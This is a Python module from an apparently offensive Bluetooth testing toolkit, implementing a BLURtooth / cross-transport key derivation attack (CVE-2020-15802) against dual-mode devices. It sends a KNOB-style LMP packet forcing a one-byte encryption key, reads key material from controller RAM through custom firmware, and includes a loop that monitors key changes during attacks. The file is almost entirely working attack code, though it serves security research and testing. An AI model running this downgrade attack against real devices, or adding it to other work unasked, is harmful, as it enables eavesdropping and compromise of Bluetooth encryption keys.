"""BLURtooth / Cross-Transport Key Derivation (CTKD) attack module.

Tests whether a dual-mode (BR/EDR + BLE) target shares key material
across transports.  A successful Classic Bluetooth attack (e.g., KNOB)
can compromise BLE security if the target derives BLE keys from the
weakened Classic key — and vice versa.

CVE-2020-15802 (BLURtooth): Cross-transport key overwrite in dual-mode
devices allows an attacker on one transport to overwrite keys on the other.

Requires DarkFirmware for connection table inspection (reads key material
from controller RAM to detect cross-transport key sharing).

Ported from DarkFirmware's blurtooth_ctkd.py.
"""

from __future__ import annotations

import time

from blue_tap.utils.output import error, info, success, warning


class CTKDAttack:
    """Cross-Transport Key Derivation vulnerability probe.

    Uses DarkFirmware's connection table inspector to snapshot key material
    before and after a Classic key negotiation, detecting whether the BLE
    transport's keys change as a result.
    """

    def __init__(self, target: str, hci: str = "hci1") -> None:
        self.target = target
        self.hci = hci

    def probe(self) -> dict:
        """Probe for CTKD vulnerability.

        Flow:
          1. Check DarkFirmware is loaded
          2. Send LMP_FEATURES_REQ to check dual-mode capability
          3. Snapshot key material (before) across all 12 slots
          4. Send LMP_ENCRYPTION_KEY_SIZE_REQ(key_size=1) — KNOB-style
          5. Snapshot key material (after)
          6. Compare: if key_src or key_copy changed → CTKD indicator
          7. Scan all slots for shared key material across transports

        Returns:
            {"vulnerable": bool, "dual_mode": bool, "key_changed": bool,
             "shared_slots": list, "before": dict, "after": dict, ...}
        """
        from blue_tap.core.firmware import ConnectionInspector, DarkFirmwareManager
        from blue_tap.core.hci_vsc import HCIVSCSocket

        result: dict = {
            "target": self.target,
            "vulnerable": False,
            "dual_mode": None,
            "key_changed": False,
            "shared_slots": [],
            "error": None,
        }

        fw = DarkFirmwareManager()
        if not fw.is_darkfirmware_loaded(self.hci):
            result["error"] = "DarkFirmware not loaded"
            error(f"DarkFirmware not detected on {self.hci}")
            return result

        hci_idx = int(self.hci.replace("hci", ""))
        inspector = ConnectionInspector()

        try:
            with HCIVSCSocket(hci_dev=hci_idx) as sock:
                # Step 1: Snapshot baseline key material
                info("CTKD: Taking key material baseline snapshot...")
                baseline = inspector.scan_all_connections(sock)
                result["before"] = {
                    c["conn_index"]: {
                        "bdaddr": c.get("bdaddr"),
                        "key_src": c.get("key_material_src"),
                        "key_copy": c.get("key_material_copy"),
                        "key_size": c.get("enc_key_size"),
                        "enc_enabled": c.get("enc_enabled"),
                        "sc_flag": c.get("secure_connections"),
                    }
                    for c in baseline
                }
                info(f"  Baseline: {len(baseline)} active connection(s)")

                # Step 2: Send LMP probe — FEATURES_REQ to check dual-mode
                info("CTKD: Sending LMP_FEATURES_REQ...")
                features_pdu = bytes([0x27])  # LMP_FEATURES_REQ
                sock.send_lmp(features_pdu)
                time.sleep(1.0)

                # Step 3: KNOB-style key size reduction
                info("CTKD: Sending LMP_ENCRYPTION_KEY_SIZE_REQ(key_size=1)...")
                knob_pdu = bytes([0x10, 0x01])  # KEY_SIZE_REQ, size=1
                sock.send_lmp(knob_pdu)
                time.sleep(2.0)

                # Step 4: Post-attack snapshot
                info("CTKD: Taking post-attack snapshot...")
                post = inspector.scan_all_connections(sock)
                result["after"] = {
                    c["conn_index"]: {
                        "bdaddr": c.get("bdaddr"),
                        "key_src": c.get("key_material_src"),
                        "key_copy": c.get("key_material_copy"),
                        "key_size": c.get("enc_key_size"),
                        "enc_enabled": c.get("enc_enabled"),
                        "sc_flag": c.get("secure_connections"),
                    }
                    for c in post
                }

                # Step 5: Compare key material
                for slot_idx, before_data in result["before"].items():
                    after_data = result["after"].get(slot_idx)
                    if after_data is None:
                        continue

                    if (before_data["key_src"] != after_data["key_src"]
                            and before_data["key_src"] != "00" * 32):
                        result["key_changed"] = True
                        warning(
                            f"  Slot {slot_idx}: key_src CHANGED after Classic attack!"
                        )
                    if (before_data["key_copy"] != after_data["key_copy"]
                            and before_data["key_copy"] != "00" * 32):
                        result["key_changed"] = True
                        warning(
                            f"  Slot {slot_idx}: key_copy CHANGED after Classic attack!"
                        )

                # Step 6: Check for shared key material across slots
                key_to_slots: dict[str, list[int]] = {}
                for c in post:
                    key = c.get("key_material_copy", "")
                    if key and key != "00" * 32:
                        key_to_slots.setdefault(key, []).append(c["conn_index"])

                for key, slots in key_to_slots.items():
                    if len(slots) > 1:
                        result["shared_slots"].append(
                            {"key": key, "slots": slots}
                        )
                        warning(
                            f"  Shared key material across slots "
                            f"{slots}: {key[:16]}..."
                        )

                # Verdict
                if result["key_changed"] or result["shared_slots"]:
                    result["vulnerable"] = True
                    success("CTKD: Target may be VULNERABLE to cross-transport key derivation")
                else:
                    info("CTKD: No cross-transport key changes detected")

        except PermissionError:
            result["error"] = "need root or CAP_NET_RAW"
            error(f"Cannot open HCI socket on {self.hci}")
        except OSError as exc:
            result["error"] = str(exc)
            error(f"HCI socket error: {exc}")
        except Exception as exc:
            result["error"] = str(exc)
            error(f"CTKD probe failed: {exc}")

        return result

    def monitor(self, interval: float = 3.0) -> None:
        """Continuously monitor key material changes across all connection slots.

        Polls the connection table every *interval* seconds and prints
        any changes to key_src, key_copy, key_size, enc_enabled, or sc_flag.
        Useful for observing CTKD during manual pairing/attack sequences.
        """
        from blue_tap.core.firmware import ConnectionInspector
        from blue_tap.core.hci_vsc import HCIVSCSocket

        hci_idx = int(self.hci.replace("hci", ""))
        inspector = ConnectionInspector()

        info(f"CTKD: Monitoring key material on {self.hci} every {interval}s (Ctrl+C to stop)...")

        prev_state: dict[int, dict] = {}

        try:
            with HCIVSCSocket(hci_dev=hci_idx) as sock:
                while True:
                    connections = inspector.scan_all_connections(sock)
                    ts = time.strftime("%H:%M:%S")

                    for c in connections:
                        idx = c["conn_index"]
                        curr = {
                            "key_src": c.get("key_material_src", ""),
                            "key_copy": c.get("key_material_copy", ""),
                            "key_size": c.get("enc_key_size"),
                            "enc_enabled": c.get("enc_enabled"),
                            "sc_flag": c.get("secure_connections"),
                        }

                        prev = prev_state.get(idx)
                        if prev is None:
                            # First observation
                            info(
                                f"[{ts}] Slot {idx}: {c.get('bdaddr')} "
                                f"key_size={curr['key_size']} "
                                f"enc={curr['enc_enabled']} "
                                f"sc={curr['sc_flag']}"
                            )
                        else:
                            # Check for changes
                            for field in ("key_src", "key_copy", "key_size", "enc_enabled", "sc_flag"):
                                if prev.get(field) != curr.get(field):
                                    warning(
                                        f"[{ts}] Slot {idx} {field} CHANGED: "
                                        f"{prev.get(field)} → {curr.get(field)}"
                                    )

                        prev_state[idx] = curr

                    time.sleep(interval)

        except KeyboardInterrupt:
            info("CTKD monitoring stopped")
        except Exception as exc:
            error(f"CTKD monitor error: {exc}")
